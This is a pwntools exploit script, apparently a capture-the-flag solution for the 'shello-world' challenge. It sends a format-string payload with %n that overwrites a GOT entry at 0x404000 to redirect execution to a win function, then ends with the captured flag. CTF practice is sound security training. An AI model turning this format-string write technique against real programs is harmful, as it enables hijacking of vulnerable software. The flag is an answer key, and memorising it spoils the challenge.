#!/usr/bin/python3

from pwn import *

exe = ELF('shello-world', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*vuln+342

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 30042)
else:
        p = process(exe.path)

GDB()
payload = f"%{exe.sym.win + 0}c%10$n".encode()
payload = payload.ljust(0x20)
payload += p64(0x404000)
sl(payload)
p.interactive()
# TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}